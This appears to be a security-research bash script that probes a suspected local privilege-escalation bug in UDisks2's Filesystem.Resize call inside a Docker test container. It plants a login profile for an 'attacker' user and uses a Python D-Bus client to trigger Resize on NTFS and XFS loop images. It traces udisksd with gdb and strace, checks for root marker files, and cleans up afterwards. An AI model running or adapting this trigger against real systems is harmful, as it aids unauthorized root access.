#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/udisks-resize-missing-goto-20260517.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

echo "UDisks Filesystem.Resize missing-goto probe"
echo "target=$TARGET"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

docker exec -i "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail

TAG=udisks-resize-missing-goto-20260517
WORK="/tmp/$TAG"
ACTIVE_USER="${ACTIVE_USER:-attacker}"
ACTIVE_HOME="/home/$ACTIVE_USER"
HOME_WORK="$ACTIVE_HOME/$TAG"
PROFILE="$ACTIVE_HOME/.bash_profile"
PROFILE_BAK="$WORK/bash_profile.backup"
PROFILE_HAD="$WORK/bash_profile.had"
CONSOLE="${CONSOLE:-9}"
ROOT_MARKER="/root/udisks_resize_missing_goto_root"
RUN_MARKER="/run/udisks_resize_missing_goto_root"
TMP_MARKER="/tmp/udisks_resize_missing_goto_root"
TRACE_PID=""
GDB_PID=""

section() {
  printf '\n== %s ==\n' "$1"
}

cleanup_target() {
  set +e
  [ -n "${TRACE_PID:-}" ] && kill "$TRACE_PID" >/dev/null 2>&1
  [ -n "${GDB_PID:-}" ] && kill "$GDB_PID" >/dev/null 2>&1
  loginctl terminate-user "$ACTIVE_USER" >/dev/null 2>&1
  systemctl start "getty@tty${CONSOLE}.service" >/dev/null 2>&1
  if [ -e "$PROFILE_HAD" ] && [ -e "$PROFILE_BAK" ]; then
    cp -a "$PROFILE_BAK" "$PROFILE"
    chown "$ACTIVE_USER:$ACTIVE_USER" "$PROFILE"
  else
    rm -f "$PROFILE"
  fi
  findmnt -rn -o TARGET,SOURCE | awk -v tag="$TAG" '$0 ~ tag {print $1}' |
    sort -r | xargs -r -n1 umount >/dev/null 2>&1
  losetup -a | awk -F: -v tag="$TAG" '$0 ~ tag {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1
  rm -rf "$HOME_WORK" "$WORK"
  rm -f "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"
  systemctl restart udisks2.service >/dev/null 2>&1
  systemctl reset-failed udisks2.service "getty@tty${CONSOLE}.service" >/dev/null 2>&1
}
trap cleanup_target EXIT

install_evidence_tools() {
  local missing=()
  for bin in gdb strace python3 openvt udisksctl gdbus; do
    command -v "$bin" >/dev/null 2>&1 || missing+=("$bin")
  done
  python3 - <<'PY' >/dev/null 2>&1 || missing+=("python3-dbus")
import dbus
PY
  if [ "${#missing[@]}" -gt 0 ]; then
    echo "installing evidence-only tools: ${missing[*]}"
    apt-get update
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
      gdb strace python3-dbus kbd
  fi
}

write_helpers() {
  rm -rf "$WORK" "$HOME_WORK"
  install -d -m 0755 "$WORK"
  install -d -o "$ACTIVE_USER" -g "$ACTIVE_USER" -m 0700 "$HOME_WORK"
  if [ -e "$PROFILE" ]; then
    cp -a "$PROFILE" "$PROFILE_BAK"
    touch "$PROFILE_HAD"
  fi

  cat >"$WORK/persistent-resize.py" <<'PY'
#!/usr/bin/env python3
import sys
import time
import dbus

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} OBJECT_PATH SIZE", file=sys.stderr)
    raise SystemExit(2)

object_path = sys.argv[1]
size = int(sys.argv[2])
bus = dbus.SystemBus()
obj = bus.get_object("org.freedesktop.UDisks2", object_path)
filesystem = dbus.Interface(obj, "org.freedesktop.UDisks2.Filesystem")
options = dbus.Dictionary({}, signature="sv")

print(f"unique_name={bus.get_unique_name()}", flush=True)
try:
    result = filesystem.Resize(dbus.UInt64(size), options, timeout=120)
    print(f"result={result!r}", flush=True)
except Exception as exc:
    print(f"exception={type(exc).__name__}: {exc}", flush=True)

print("holding_system_bus_name=8s", flush=True)
time.sleep(8)
PY
  chmod 0755 "$WORK/persistent-resize.py"

  cat >"$HOME_WORK/user-probe.sh" <<'USER_PROBE'
#!/usr/bin/env bash
set +e
TAG=udisks-resize-missing-goto-20260517
WORK="/tmp/$TAG"
MODE="$(cat "$WORK/mode")"
OUT="$WORK/user-$MODE.log"
exec >"$OUT" 2>&1

echo "mode=$MODE"
echo "identity=$(id)"
echo "tty=$(tty)"
echo "XDG_SESSION_ID=${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" \
    -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
fi

echo
echo "polkit_active_checks"
for aid in \
  org.freedesktop.udisks2.loop-setup \
  org.freedesktop.udisks2.filesystem-mount \
  org.freedesktop.udisks2.modify-device; do
  pkcheck --process $$ --action-id "$aid" --allow-user-interaction >/dev/null 2>&1
  echo "$aid rc=$?"
done

case "$MODE" in
  ntfs-mounted)
    img="$HOME/$TAG/ntfs-mounted.img"
    truncate -s 96M "$img"
    mkfs.ntfs -F -Q -L RESIZENTFS "$img"
    new_size=$((64 * 1024 * 1024))
    ;;
  xfs-unmounted)
    img="$HOME/$TAG/xfs-unmounted.img"
    truncate -s 512M "$img"
    mkfs.xfs -f -m reflink=0 -L RESIZEXFS "$img"
    new_size=$((384 * 1024 * 1024))
    ;;
  *)
    echo "unknown mode=$MODE"
    exit 2
    ;;
esac

echo "image=$img"
loop_out="$(udisksctl loop-setup -f "$img" --no-user-interaction 2>&1)"
loop_rc=$?
echo "$loop_out"
echo "loop_setup_rc=$loop_rc"
dev="$(printf '%s\n' "$loop_out" | sed -n 's/.* as \(\/dev\/loop[0-9][0-9]*\).*/\1/p' | tail -n 1)"
echo "dev=$dev"
[ -n "$dev" ] || exit 20
base="${dev##*/}"
obj="/org/freedesktop/UDisks2/block_devices/$base"
echo "obj=$obj"
udevadm settle --timeout=15 2>&1 || true
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path "$obj" \
  --method org.freedesktop.UDisks2.Block.Rescan "{}" 2>&1 || true
sleep 1

if [ "$MODE" = "ntfs-mounted" ]; then
  mount_out="$(udisksctl mount -b "$dev" --no-user-interaction 2>&1)"
  mount_rc=$?
  echo "$mount_out"
  echo "mount_rc=$mount_rc"
  findmnt "$dev" || true
fi

echo "calling Resize size=$new_size"
python3 "$WORK/persistent-resize.py" "$obj" "$new_size"
echo "resize_call_rc=$?"
findmnt "$dev" || true
ls -l /root/udisks_resize_missing_goto_root /run/udisks_resize_missing_goto_root /tmp/udisks_resize_missing_goto_root 2>&1 || true
USER_PROBE
  chmod 0755 "$HOME_WORK/user-probe.sh"
  chown -R "$ACTIVE_USER:$ACTIVE_USER" "$HOME_WORK"

  cat >"$PROFILE" <<EOF
"$HOME_WORK/user-probe.sh"
exit
EOF
  chown "$ACTIVE_USER:$ACTIVE_USER" "$PROFILE"
  chmod 0644 "$PROFILE"
}

write_gdb_cmd() {
  cat >"$WORK/gdb-resize.cmd" <<'GDB'
set pagination off
set confirm off
set breakpoint pending on
set print thread-events off
set detach-on-fork on
set follow-fork-mode parent
handle SIGPIPE nostop noprint pass
handle SIGSEGV stop print pass

break g_dbus_method_invocation_return_error
commands
silent
printf "HIT return_error inv=%p domain=%d code=%d\n", $x0, (int)$x1, (int)$x2
bt 6
continue
end

break udisks_daemon_util_check_authorization_sync
commands
silent
printf "HIT auth action=%s invocation=%p\n", (char *) $x2, $x5
bt 6
continue
end

break bd_fs_resize
commands
silent
printf "HIT bd_fs_resize device=%s size=%lu type=%s\n", (char *) $x0, (unsigned long) $x1, (char *) $x2
bt 10
continue
end

continue
printf "GDB_STOPPED_AFTER_CONTINUE\n"
bt 20
info registers
thread apply all bt 10
detach
quit
GDB
}

run_active_mode() {
  local mode="$1"
  echo "$mode" >"$WORK/mode"
  rm -f "$WORK/user-$mode.log" "$WORK/openvt-$mode.log"
  : >"$WORK/user-$mode.log"
  chown "$ACTIVE_USER:$ACTIVE_USER" "$WORK/user-$mode.log"
  systemctl stop "getty@tty${CONSOLE}.service" >/dev/null 2>&1 || true
  set +e
  timeout 180 openvt -c "$CONSOLE" -s -f -w -- /bin/login -f "$ACTIVE_USER" >"$WORK/openvt-$mode.log" 2>&1
  local rc=$?
  set -e
  echo "openvt_$mode rc=$rc"
  systemctl start "getty@tty${CONSOLE}.service" >/dev/null 2>&1 || true
  loginctl terminate-user "$ACTIVE_USER" >/dev/null 2>&1 || true
}

run_gdb_mode() {
  local mode="$1"
  section "gdb $mode trigger"
  systemctl restart udisks2.service
  local pid
  pid="$(pidof udisksd | awk '{print $1}')"
  echo "udisksd_pid=$pid"
  write_gdb_cmd
  set +e
  timeout 130 gdb -q -batch -p "$pid" -x "$WORK/gdb-resize.cmd" >"$WORK/gdb-$mode.log" 2>&1 &
  GDB_PID=$!
  sleep 2
  run_active_mode "$mode"
  wait "$GDB_PID"
  echo "gdb_${mode}_rc=$?"
  GDB_PID=""
  set -e
  systemctl restart udisks2.service >/dev/null 2>&1 || true
}

run_strace_mode() {
  local mode="$1"
  section "strace $mode trigger"
  systemctl restart udisks2.service
  local pid
  pid="$(pidof udisksd | awk '{print $1}')"
  echo "udisksd_pid=$pid"
  set +e
  timeout 100 strace -ff -s 300 -v -e trace=execve -o "$WORK/strace-$mode" -p "$pid" >"$WORK/strace-$mode.attach.out" 2>"$WORK/strace-$mode.attach.err" &
  TRACE_PID=$!
  sleep 1
  run_active_mode "$mode"
  wait "$TRACE_PID"
  echo "strace_${mode}_rc=$?"
  TRACE_PID=""
  set -e
  systemctl restart udisks2.service >/dev/null 2>&1 || true
}

section "baseline"
install_evidence_tools
rm -f "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"
cat /etc/os-release | sed -n '1,8p'
uname -a
id "$ACTIVE_USER"
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  udisks2 libudisks2-0 libblockdev3 libblockdev-fs3 polkitd systemd \
  ntfs-3g xfsprogs btrfs-progs dosfstools e2fsprogs strace gdb python3-dbus 2>&1 | sort || true
for bin in ntfsresize mkfs.ntfs xfs_growfs mkfs.xfs resize2fs; do
  printf '%s\t' "$bin"
  command -v "$bin" || true
done
systemctl is-enabled udisks2.service 2>&1 || true
systemctl is-active udisks2.service 2>&1 || true
systemctl cat udisks2.service --no-pager | sed -n '1,80p'

section "polkit defaults"
python3 - <<'PY'
import xml.etree.ElementTree as ET
ids = [
    "org.freedesktop.udisks2.loop-setup",
    "org.freedesktop.udisks2.filesystem-mount",
    "org.freedesktop.udisks2.modify-device",
    "org.freedesktop.udisks2.modify-device-system",
    "org.freedesktop.udisks2.modify-device-other-seat",
]
root = ET.parse("/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy").getroot()
by_id = {a.attrib.get("id"): a for a in root.findall("action")}
for aid in ids:
    d = by_id[aid].find("defaults")
    vals = {c.tag: (c.text or "").strip() for c in list(d)}
    print(f"{aid}\tany={vals.get('allow_any')}\tinactive={vals.get('allow_inactive')}\tactive={vals.get('allow_active')}")
PY

section "source evidence"
if [ -e /tmp/udisks2-2.10.1/src/udiskslinuxfilesystem.c ]; then
  nl -ba /tmp/udisks2-2.10.1/src/udiskslinuxfilesystem.c | sed -n '1930,2065p'
else
  echo "/tmp/udisks2-2.10.1 source tree absent in target; host workspace source has the same lines"
fi

if ! command -v ntfsresize >/dev/null 2>&1 || ! command -v mkfs.ntfs >/dev/null 2>&1; then
  echo "SKIP ntfs-mounted: ntfs-3g helper not present in current default package state"
fi
if ! command -v xfs_growfs >/dev/null 2>&1 || ! command -v mkfs.xfs >/dev/null 2>&1; then
  echo "SKIP xfs-unmounted: xfsprogs helper not present in current default package state"
fi

write_helpers
if command -v ntfsresize >/dev/null 2>&1 && command -v mkfs.ntfs >/dev/null 2>&1; then
  run_gdb_mode ntfs-mounted
fi
if command -v xfs_growfs >/dev/null 2>&1 && command -v mkfs.xfs >/dev/null 2>&1; then
  run_strace_mode xfs-unmounted
fi

section "user trigger logs"
for mode in ntfs-mounted xfs-unmounted; do
  echo "--- user-$mode.log ---"
  sed -n '1,220p' "$WORK/user-$mode.log" 2>&1 || true
  echo "--- openvt-$mode.log ---"
  sed -n '1,80p' "$WORK/openvt-$mode.log" 2>&1 || true
done

section "gdb evidence"
for f in "$WORK"/gdb-*.log; do
  [ -e "$f" ] || continue
  echo "--- $f ---"
  grep -E 'HIT return_error|HIT auth|HIT bd_fs_resize|SIGSEGV|GDB_STOPPED|^#0|g_type_check|Thread|received signal' \
    "$f" 2>&1 | sed -n '1,260p' || true
  echo "--- tail $f ---"
  tail -n 100 "$f" 2>&1 || true
done

section "strace execve evidence"
for f in "$WORK"/strace-*.*; do
  [ -e "$f" ] || continue
  echo "--- $f ---"
  grep -E 'execve\(' "$f" 2>/dev/null | sed -n '1,120p' || true
done

section "journal evidence"
journalctl -b -u udisks2.service --no-pager -n 160 2>&1 |
  grep -E "$TAG|Mounted /dev/loop|Cannot resize|status=11|SEGV|udisks daemon version|Started udisks2" |
  tail -n 100 || true

section "root proof check before cleanup"
for p in "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"; do
  if [ -e "$p" ]; then
    stat -Lc '%A %a %U:%G %n' "$p"
    sed -n '1,20p' "$p" || true
  else
    echo "ABSENT $p"
  fi
done
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_PROOF=YES"
else
  echo "ROOT_PROOF=NO"
fi

section "cleanup proof"
cleanup_target
trap - EXIT
for p in "$WORK" "$HOME_WORK" "$ROOT_MARKER" "$RUN_MARKER" "$TMP_MARKER"; do
  [ -e "$p" ] && echo "PRESENT $p" || echo "ABSENT $p"
done
echo "udisks2_active=$(systemctl is-active udisks2.service 2>&1 || true)"
echo "failed_units:"
systemctl --failed --no-legend 2>&1 || true
echo "our_loop_devices:"
losetup -a | grep "$TAG" || echo "none"
echo "our_mounts:"
findmnt -rn -o SOURCE,TARGET | grep "$TAG" || echo "none"
TARGET_SCRIPT

echo
echo "wrote $LOG"
